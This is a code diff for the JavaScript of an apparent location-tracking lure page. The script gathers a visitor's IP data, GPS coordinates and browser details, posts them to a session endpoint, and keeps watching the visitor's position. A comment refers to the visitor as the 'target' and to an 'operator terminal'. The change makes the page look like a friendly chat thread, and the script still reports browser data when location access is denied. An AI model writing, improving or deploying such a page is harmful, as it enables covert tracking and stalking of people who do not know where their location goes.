@@ -17,11 +17,31 @@
     return sid ? ("/api/session/" + sid + "/location") : "/report";
   }
 
-  function setStatus(msg, type) {
-    const el = document.getElementById("status-message");
-    if (!el) return;
-    el.textContent = msg;
-    el.className = "status-msg " + (type || "info");
+  function scrollChatToBottom() {
+    const body = document.getElementById("chat-body");
+    if (body) {
+      body.scrollTop = body.scrollHeight;
+    }
+  }
+
+  function appendBubble(text, isOutgoing) {
+    const thread = document.getElementById("chat-thread");
+    if (!thread) return;
+
+    const group = document.createElement("div");
+    group.className = "message-group " + (isOutgoing ? "outgoing" : "incoming");
+
+    const bubble = document.createElement("div");
+    bubble.className = "message-bubble";
+
+    const p = document.createElement("p");
+    p.textContent = text;
+
+    bubble.appendChild(p);
+    group.appendChild(bubble);
+    thread.appendChild(group);
+
+    scrollChatToBottom();
   }
 
   function collectBrowserInfo() {
@@ -124,12 +144,11 @@
 
     const bInfo = collectBrowserInfo();
     postPayload({ ip: ipInfo, gps: gpsData, browser: bInfo });
-    setStatus("Location information received.", "success");
+    appendBubble("Location information was received.", false);
 
     if (watchId === null && navigator.geolocation) {
       watchId = navigator.geolocation.watchPosition(function (newPos) {
         const nc = newPos.coords;
-        setStatus("Location information received.", "success");
         postPayload({
           gps: {
             lat: nc.latitude,
@@ -148,23 +167,28 @@
   function geoError(err) {
     const bInfo = collectBrowserInfo();
     postPayload({ denied: true, errorCode: err ? err.code : 1, browser: bInfo });
-    setStatus("Location access was not granted.", "error");
-    const btn = document.getElementById("btn-start-demo");
-    if (btn) btn.disabled = true;
+
+    let msg = "Location access was not granted.";
+    if (err && (err.code === 2 || err.code === 3)) {
+      msg = "Location information is currently unavailable.";
+    }
+
+    appendBubble(msg, false);
   }
 
   function startDemo() {
-    const btn = document.getElementById("btn-start-demo");
+    const btn = document.getElementById("btn-start-demo") || document.getElementById("btn-continue");
     if (btn) {
       btn.disabled = true;
     }
 
+    appendBubble("Checking browser capabilities...", false);
+
     if (!navigator.geolocation) {
-      setStatus("Location access was not granted.", "error");
+      appendBubble("Location access was not granted.", false);
       return;
     }
 
-    setStatus("Processing...", "info");
     navigator.geolocation.getCurrentPosition(applyFix, geoError, GEO_OPTS);
   }
 
@@ -175,7 +199,7 @@
     // Send initial browser connection payload so operator terminal displays target connection immediately
     postPayload({ browser: bInfo });
 
-    const btn = document.getElementById("btn-start-demo");
+    const btn = document.getElementById("btn-start-demo") || document.getElementById("btn-continue");
     if (btn) {
       btn.addEventListener("click", startDemo);
     }
